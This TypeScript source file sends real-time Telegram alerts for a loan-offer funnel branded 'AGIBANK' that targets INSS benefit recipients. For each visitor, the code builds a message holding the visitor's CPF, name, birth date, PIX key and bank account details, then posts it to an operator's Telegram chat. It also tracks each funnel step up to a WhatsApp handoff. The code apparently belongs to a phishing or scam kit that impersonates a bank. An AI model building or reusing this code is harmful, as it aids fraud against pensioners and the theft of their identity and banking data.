import { evaluateLeadQuality, type LeadMetadata } from "./tracker-core";
import { brl } from "./loan";

// Cache em memória de message_id por lead para evitar SPAM no chat (atualiza a mesma mensagem!)
const leadMessageMap = new Map<string, number>();

// Envia ou atualiza a mensagem no Telegram do Admin Supremo com Inline Keyboard Dashboard
export async function sendTelegramNotification(metadata: LeadMetadata): Promise<boolean> {
  const token = process.env["TELEGRAM_BOT_TOKEN"];
  const chatId = process.env["TELEGRAM_ADMIN_CHAT_ID"];

  if (!token || !chatId) {
    console.warn("[Telegram Notifier] TELEGRAM_BOT_TOKEN ou TELEGRAM_ADMIN_CHAT_ID não definidos.");
    return false;
  }

  const quality = evaluateLeadQuality(metadata);
  const now = new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" });

  const tierBadge = {
    DIAMANTE: "💎 DIAMANTE (LEAD REAL / CONVERTIDO)",
    OURO: "🥇 OURO (ALTA INTENÇÃO / COMPLETO)",
    PRATA: "🥈 PRATA (EM ANDAMENTO)",
    CURIOSO: "👀 CURIOSO (INICIAL)",
    BOT_SUSPEITO: "⚠️ BOT OU INVÁLIDO",
  }[quality.tier];

  const stepLabels: Record<string, string> = {
    visit: "🌐 1. Acesso à Página Inicial",
    cpf_entered: "📝 2. Digitou CPF",
    cpf_validated: "✅ 3. CPF Validado na Receita Federal",
    perfil_selected: "👤 4. Perfil INSS Selecionado",
    motivo_selected: "📄 5. Motivo do Benefício",
    tempo_selected: "⏳ 6. Tempo de Benefício",
    faixa_selected: "💰 7. Faixa Salarial do Benefício",
    diretrizes_accepted: "⚖️ 8. Termos & Diretrizes Aceitos",
    analysis_completed: "🔍 9. Análise e Score Calculado",
    score_viewed: "📊 10. Visualizou Pontuação do Score",
    valor_viewed: "💵 11. Visualizou Valor Liberado",
    bancos_selected: "🏦 12. Selecionou Bancos onde Recebe",
    payout_entered: "💳 13. Informou Dados de Recebimento",
    review_accepted: "📑 14. Confirmou Proposta & Protocolo Gerado",
    whatsapp_clicked: "🚀 15. CLICOU PARA FALAR NO WHATSAPP COM O GERENTE!",
    page_exit: "🚪 ABANDONOU A PÁGINA",
  };

  // Monta resumo das respostas fornecidas pelo lead
  const respostas: string[] = [];
  if (metadata.cpf) respostas.push(`• <b>CPF:</b> <code>${metadata.cpf}</code>`);
  if (metadata.name) respostas.push(`• <b>Nome do Titular:</b> ${metadata.name}`);
  if (metadata.birthDate) respostas.push(`• <b>Nascimento:</b> ${metadata.birthDate}`);
  if (metadata.profile) respostas.push(`• <b>Perfil INSS:</b> ${metadata.profile}`);
  if (metadata.reason) respostas.push(`• <b>Motivo:</b> ${metadata.reason}`);
  if (metadata.duration) respostas.push(`• <b>Tempo Recebimento:</b> ${metadata.duration}`);
  if (metadata.range) respostas.push(`• <b>Faixa Benefício:</b> ${metadata.range}`);
  if (metadata.calculatedScore) respostas.push(`• <b>Score de Crédito:</b> ${metadata.calculatedScore} pts`);
  if (metadata.approvedAmount) respostas.push(`• <b>Valor Pré-Aprovado:</b> <b>${brl(metadata.approvedAmount)}</b>`);
  if (metadata.otherBanks && metadata.otherBanks.length > 0) respostas.push(`• <b>Bancos Declarados:</b> ${metadata.otherBanks.join(", ")}`);
  if (metadata.payoutMethod) {
    if (metadata.payoutMethod === "pix" && metadata.pixKey) {
      respostas.push(`• <b>Recebimento:</b> PIX (${metadata.pixType ?? "chave"}): <code>${metadata.pixKey}</code>`);
    } else if (metadata.payoutMethod === "conta" && (metadata.account || metadata.bankName)) {
      respostas.push(`• <b>Recebimento:</b> Conta: ${metadata.bankName ?? "-"} | Ag: ${metadata.agency ?? "-"} | CC: ${metadata.account ?? "-"}`);
    }
  }

  const message = [
    `<b>📊 PAINEL DE CONTROLE DE LEADS · AGIBANK</b>`,
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    `<b>📍 Etapa Atual:</b> <b>${stepLabels[metadata.step] ?? metadata.step}</b>`,
    metadata.stepDetails ? `<i>ℹ️ ${metadata.stepDetails}</i>` : "",
    `<b>🕒 Atualizado em:</b> <code>${now}</code>`,
    ``,
    `<b>🎯 ANÁLISE DE QUALIDADE DO LEAD:</b>`,
    `<b>Classificação:</b> <code>${tierBadge}</code>`,
    `<b>Pontuação Real:</b> <b>${quality.score}/100</b>`,
    quality.badges.length > 0 ? `<b>Selos:</b> ${quality.badges.map((b) => `<code>[${b}]</code>`).join(" ")}` : "",
    ``,
    `<b>📋 RESPOSTAS FORNECIDAS PELO LEAD:</b>`,
    respostas.length > 0 ? respostas.join("\n") : "<i>Aguardando primeiras respostas...</i>",
    ``,
    `<b>📱 ORIGEM E DISPOSITIVO:</b>`,
    metadata.deviceType ? `• <b>Aparelho:</b> ${metadata.deviceType}` : "",
    metadata.timeOnSiteSeconds !== undefined ? `• <b>Tempo Ativo no Funil:</b> ${metadata.timeOnSiteSeconds}s` : "",
    `• <b>ID da Sessão:</b> <code>${metadata.leadId}</code>`,
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
  ]
    .filter((line) => line !== "")
    .join("\n");

  // Botões interativos no Telegram (Inline Keyboard Dashboard)
  const inlineKeyboard = [];
  const actionRow = [];

  // Se tem CPF ou celular, adiciona botão de consulta rápida
  if (metadata.cpf) {
    actionRow.push({
      text: "🔍 Copiar CPF",
      switch_inline_query_current_chat: metadata.cpf,
    });
  }

  if (actionRow.length > 0) {
    inlineKeyboard.push(actionRow);
  }

  // Linha de ações do admin
  inlineKeyboard.push([
    {
      text: "⚡ Status: " + quality.tier,
      callback_data: `status_${metadata.leadId}`,
    },
    {
      text: "⏱️ " + (metadata.timeOnSiteSeconds ?? 0) + "s online",
      callback_data: `time_${metadata.leadId}`,
    },
  ]);

  const existingMessageId = leadMessageMap.get(metadata.leadId);

  try {
    // 1. Se já existe mensagem enviada para esse lead, EDITA a mesma mensagem (Zero SPAM!)
    if (existingMessageId) {
      const editUrl = `https://api.telegram.org/bot${token}/editMessageText`;
      const editRes = await fetch(editUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: existingMessageId,
          text: message,
          parse_mode: "HTML",
          disable_web_page_preview: true,
          reply_markup: { inline_keyboard: inlineKeyboard },
        }),
      });

      if (editRes.ok) {
        return true;
      }
      // Se não conseguiu editar (ex: mensagem muito antiga ou apagada), prossegue para enviar nova
    }

    // 2. Envia nova mensagem e armazena o ID no Map para as próximas atualizações
    const sendUrl = `https://api.telegram.org/bot${token}/sendMessage`;
    const sendRes = await fetch(sendUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: true,
        reply_markup: { inline_keyboard: inlineKeyboard },
      }),
    });

    if (sendRes.ok) {
      const data = (await sendRes.json()) as { ok: boolean; result?: { message_id: number } };
      if (data.ok && data.result?.message_id) {
        leadMessageMap.set(metadata.leadId, data.result.message_id);
      }
      return true;
    }

    return false;
  } catch (err) {
    console.error("[Telegram Notifier] Erro ao comunicar com o Telegram:", err);
    return false;
  }
}

